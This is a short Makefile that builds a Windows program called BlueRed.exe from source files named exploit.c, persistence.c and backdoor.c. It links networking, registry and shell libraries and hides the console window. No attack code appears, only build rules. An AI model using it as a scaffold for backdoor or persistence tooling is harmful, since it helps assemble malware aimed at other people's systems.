# Compiler and Flags
CC = "C:\Program Files\mingw64\bin\gcc.exe"
CFLAGS = -Wall -Wextra -O2 -mwindows -msse2
LDFLAGS = -lws2_32 -ladvapi32 -lshell32

# Directories
INCLUDE_DIR = include
SRC_DIR = src

# Source Files
SOURCES = \
    $(SRC_DIR)/main.c \
    $(SRC_DIR)/exploit.c \
    $(SRC_DIR)/persistence.c \
    $(SRC_DIR)/backdoor.c

OBJECTS = $(SOURCES:.c=.o)
TARGET = $(SRC_DIR)/BlueRed.exe

# Default target
.PHONY: all clean

all: $(TARGET)

$(TARGET): $(OBJECTS)
	$(CC) $(CFLAGS) -o $(TARGET) $(OBJECTS) $(LDFLAGS)

%.o: %.c include/config.h
	$(CC) $(CFLAGS) -I$(INCLUDE_DIR) -c $< -o $@

clean:
	rm -f $(OBJECTS) $(TARGET)
